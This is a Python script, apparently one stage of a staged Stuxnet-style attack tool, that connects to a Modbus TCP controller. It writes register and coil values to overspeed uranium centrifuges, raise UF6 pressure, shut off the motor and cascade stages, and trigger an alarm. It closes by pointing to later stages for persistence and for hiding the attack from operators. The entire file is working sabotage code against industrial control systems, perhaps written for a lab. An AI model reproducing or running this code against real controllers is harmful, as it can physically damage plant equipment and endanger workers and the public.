import time
from pymodbus.client import ModbusTcpClient
from scripts.config import get, REGISTERS
from utils.colors import ok, err, info, red, green, yellow, cyan, white
from utils import logger

STAGE = {
    'name': 'Execute Attack',
    'key':  '3',
    'desc': '3-phase sabotage: overspeed / motor cut / alarm',
}

BANNER = f"""
{red("  ╔══════════════════════════════════════╗")}
{red("  ║")} {white("STAGE 3 -- ATTACK SEQUENCE             ")}{red("║")}
{red("  ╚══════════════════════════════════════╝")}
"""

ATTACK = REGISTERS['attack']


def _phase(label):
    print(f"\n  {red('>>>')} {yellow(label)}")
    print(f"  {'─'*46}")


def run(cfg=None):
    if cfg is None:
        cfg = get()
    ip   = cfg['target_ip']
    port = cfg['target_port']

    print(BANNER)
    print(red("  WARNING: This will alter PLC register values."))
    confirm = input(yellow("  Type YES to proceed: ")).strip()
    if confirm != 'YES':
        print(info("Aborted."))
        return

    print()
    print(info(f"Connecting to {ip}:{port}..."))
    client = ModbusTcpClient(ip, port=port)
    if not client.connect():
        print(err("Connection failed."))
        logger.error(f"Attack aborted -- could not connect to {ip}:{port}")
        return

    print(ok("Connected. No authentication required."))
    logger.attack(f"Attack started against {ip}:{port}")

    _phase("Phase 1: Centrifuge Overspeed")
    print(info("Forcing RPM from 1064 Hz to 1410 Hz..."))
    print(info("(Real Stuxnet target frequency -- causes rotor stress)"))
    client.write_register(address=0, value=1410)
    time.sleep(0.3)
    client.write_register(address=1, value=650)
    print(ok("RPM register overwritten: 1410 Hz"))
    print(ok("Pressure rising: 650 mbar"))
    logger.attack("Phase 1 complete -- RPM=1410, Pressure=650")
    time.sleep(2)

    _phase("Phase 2: Motor Cutoff")
    print(info("Cutting centrifuge motor..."))
    client.write_coil(address=0, value=False)
    time.sleep(0.2)
    print(info("Taking cascade stages offline..."))
    client.write_coil(address=1, value=False)
    client.write_coil(address=2, value=False)
    client.write_coil(address=3, value=False)
    print(ok("Motor offline."))
    print(ok("Cascade stages 1, 2, 3 offline."))
    logger.attack("Phase 2 complete -- motor and cascade offline")
    time.sleep(2)

    _phase("Phase 3: Alarm Trigger")
    print(info("Writing alarm register..."))
    client.write_coil(address=4, value=True)
    print(ok("Alarm triggered."))
    logger.attack("Phase 3 complete -- alarm triggered")
    time.sleep(1)

    coils = client.read_coils(address=0, count=5)
    regs  = client.read_holding_registers(address=0, count=2)
    r     = regs.registers

    print(f"\n  {red('POST-ATTACK SYSTEM STATE')}")
    print(f"  {'─'*46}")
    print(f"  {'Centrifuge Motor':<22}: {red('False  (OFFLINE)')}")
    print(f"  {'Cascade Stage 1':<22}: {red('False  (OFFLINE)')}")
    print(f"  {'Cascade Stage 2':<22}: {red('False  (OFFLINE)')}")
    print(f"  {'Cascade Stage 3':<22}: {red('False  (OFFLINE)')}")
    print(f"  {'Alarm Status':<22}: {red('True   (TRIGGERED)')}")
    print(f"  {'─'*46}")
    print(f"  {'Centrifuge RPM':<22}: {red(str(r[0]) + ' Hz  (CRITICAL -- Normal: 1064)')}")
    print(f"  {'UF6 Pressure':<22}: {red(str(r[1]) + ' mbar (CRITICAL -- Normal: 485)')}")
    print()
    print(ok("Attack complete. Centrifuge cascade offline."))
    print(info("Run stage 4 to enable persistence."))
    print(info("Run stage 5 to mask this from the operator view."))
    print()

    logger.success(f"Attack complete on {ip}:{port} -- RPM={r[0]}, Pressure={r[1]}")
    client.close()
